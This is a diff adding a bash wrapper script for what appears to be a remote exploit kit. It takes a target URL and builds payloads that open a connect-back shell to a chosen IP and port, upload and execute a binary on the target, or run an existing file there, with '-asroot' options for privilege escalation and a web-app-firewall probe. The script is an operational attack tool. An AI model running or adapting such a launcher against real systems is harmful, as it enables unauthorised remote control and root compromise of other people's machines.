@@ -1,0 +1,194 @@
+#!/bin/bash
+
+usage() {
+cat <<EOF
+Usage: $0 [-v -h -p] TARGETURL PAYLOAD [PAYLOAD_OPTS]
+    Payloads:
+        callback IP PORT
+        runexisting [-e NAME=VAL [-e NAME=VAL] ... ] FILE CMD [CMD_ARG ...]
+        uploadnrun [-e NAME=VAL [-e NAME=VAL] ... ] FILE CMD [CMD_ARG ...]
+
+    Global Options:
+      -h     Print help message
+      -v     Increase verbosity
+      -p     Do not probe for a web app firewall
+EOF
+}
+
+# Lookup table for log level descriptions
+LOGLVLS=(SEVERE WARNING INFO CONFIG FINE FINER FINEST)
+
+#
+# Initialize and parse command line arguments
+#
+KILL_PARENT=1
+LOGLVL=0
+MAKE_QUIET="-s"
+FW_PROBE=1
+
+while getopts "vhpl:-" OPT; do
+    case "$OPT" in
+    v) LOGLVL=$(($LOGLVL + 1)) ;;
+    h) usage; exit 1 ;;
+    p) FW_PROBE=0 ;;
+    -) break ;;
+    *) echo "ERROR: Invalid option $OPT." >&2; usage; exit 1 ;; 
+    esac
+done
+
+shift $(( $OPTIND - 1 ))
+
+ENVP=${ENVP%% }                  # remove trailing space
+LOGLVL_NAME=${LOGLVLS[$LOGLVL]}  # convert to log level description
+
+if (( $LOGLVL > 1 )); then
+    MAKE_QUIET=""
+fi
+
+TARGETURL=$1
+PAYLOAD=$2
+
+if [ -z "$TARGETURL" ]; then
+    echo "ERROR: TARGETURL not specified" >&2
+    usage
+    exit 1
+fi
+
+if [ -z "$PAYLOAD" ]; then
+    echo "ERROR: PAYLOAD not specified" >&2
+    usage
+    exit 1
+fi
+
+TH_OPTIONS="--log-level $LOGLVL_NAME"
+
+if (( FW_PROBE == 0 )) ; then
+    export DISABLE_PROBE=""
+fi
+
+if (( $LOGLVL > 2 )) ; then
+    echo TARGETURL=$TARGETURL
+    echo PAYLOAD=$PAYLOAD
+    echo LOGLVL=$LOGLVL
+    echo LOGLVL_NAME=$LOGLVL_NAME
+    echo LOG_PREFIX=$LOG_PREFIX
+    echo MAKE_QUIET=$MAKE_QUIET
+    echo TH_OPTIONS=$TH_OPTIONS
+fi
+
+#
+# Handle payload types:
+#
+case $PAYLOAD in
+    callback|callback-asroot)
+        case $PAYLOAD in
+      callback)
+        PAYLOAD_TGT=connectbacksh
+        ;;
+      callback-asroot) 
+        export ELEVATE=1
+        PAYLOAD_TGT=connectbacksh
+        ;;
+    esac
+        
+    MY_IP="$3"
+    if [ -z "$MY_IP" ]; then
+        echo "ERROR: Must specify a callback IP address." >&2
+        exit 1
+    fi
+
+    MY_PORT="$4"
+    if [  -z "$MY_PORT" ] && [[ ! $MY_PORT =~ ^[[:digit:]]+$ ]]; then
+        echo "ERROR: Invalid callback port: [$MY_PORT]." >&2
+        exit 1
+    fi
+
+    cd payload
+
+    make $MAKE_QUIET $PAYLOAD_TGT \
+        TGTURL="$TARGETURL" US="$MY_IP" PORT="$MY_PORT"  \
+        TH_OPTIONS="$TH_OPTIONS" \
+        || { echo "Failed" >&2; exit 1; }
+        ;;
+
+    uploadnrun|uploadnrun-asroot|runexisting|runexisting-asroot)
+        ENVP=""
+        OPTIND=3
+        while getopts "e:" OPT; do
+            case $OPT in
+                e) ENVP="$ENVP '$OPTARG'" ;;
+                *) echo "ERROR: Invalid option to $PAYLOAD: -$OPT" >&2; usage; exit 1 ;;
+            esac
+        done
+        shift $(( OPTIND - 1 ))
+
+        EXE=$(readlink -f "$1")
+        if [ ${PAYLOAD%%-asroot} == "uploadnrun" ] && [ ! -x "$EXE" ]; then
+            echo "ERROR: $EXE does not exist or is not executable." >&2
+            exit 1
+        fi
+
+        shift
+        ARGV="$1"
+        shift
+        while [ ! -z "$1" ]; do
+           ARGV="$ARGV '$1'"
+           shift
+        done
+
+        if [ -z "$ARGV" ]; then
+            echo "ERROR: No exec command name specified." >&2
+            exit 1
+        fi
+
+        if (( $LOGLVL > 2 )) ; then
+            echo ENVP=$ENVP
+            echo ARGV=$ARGV
+        fi
+
+        case $PAYLOAD in
+        uploadnrun)
+          PAYLOAD_TGT=uploadnrun
+          EXE_ARG=EXECUTABLE
+          ;;
+        uploadnrun-asroot)
+          PAYLOAD_TGT=uploadnrun
+          export ELEVATE=1
+          EXE_ARG=EXECUTABLE
+          ;;
+        runexisting)
+          PAYLOAD_TGT=runexisting
+          EXE_ARG=FILENAME
+          ;;
+        runexisting-asroot)
+          PAYLOAD_TGT=runexisting
+          export ELEVATE=1
+          EXE_ARG=FILENAME
+          ;;
+        esac
+
+        cd payload
+
+        make $MAKE_QUIET "$PAYLOAD_TGT" \
+            TGTURL="$TARGETURL" $EXE_ARG="$EXE" STDIN= ARGV="$ARGV" ENVP="$ENVP" \
+            TH_OPTIONS="$TH_OPTIONS"  \
+            || { echo "Failed." >&2; exit 1; }
+
+        if [[ ${PAYLOAD%%-asroot} == "runexisting" ]] ; then
+            # Print the most recent response.  This should be what
+            # we just did.
+            echo "WARNING: remove old log files between runs to ensure this output is not stale."
+            cat $(ls -1t *.poke_mem.response | head -1)
+        fi
+        ;;
+
+    *)
+        echo "ERROR: Invalid payload type: [$PAYLOAD]" >&2
+        exit 1
+        ;;
+
+esac
+
+echo ">> See all logs in $PWD"
+
+# vim:expandtab:shiftwidth=4:tabstop=4
